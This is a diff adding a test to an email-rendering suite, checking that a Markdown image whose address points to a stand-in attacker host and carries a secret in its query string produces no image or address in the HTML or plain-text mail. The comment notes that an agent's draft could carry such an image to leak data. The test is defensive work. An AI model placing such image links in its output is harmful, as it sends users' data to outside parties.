@@ -119,6 +119,19 @@ describe("rendering with a design", () => {
     const plain = await render({ headerText: "Acme Support" });
     expect(plain.html).not.toContain("<img");
     expect(plain.text).toContain("Acme Support");
+    // Markdown for an image, such as an agent's draft could carry to leak data
+    // through the address of an image, makes no image in the HTML of the mail.
+    const imageMail = await renderEmail({
+      project: "Design",
+      markdown: "Hello ![x](https://evil.example/p.png?d=SECRET) there",
+      language: "en",
+    });
+    expect(imageMail.html).not.toContain("<img");
+    expect(imageMail.html).not.toContain("evil.example");
+    expect(imageMail.html).toContain("Hello");
+    // The plain-text part has neither the image nor its address.
+    expect(imageMail.text).not.toContain("p.png");
+    expect(imageMail.text).toContain("Hello");
     // The built-in design shows the project name and carries no footer.
     const builtIn = await renderEmail({ project: "Design", markdown: "Hi", language: "en" });
     expect(builtIn.text).toContain("Design");
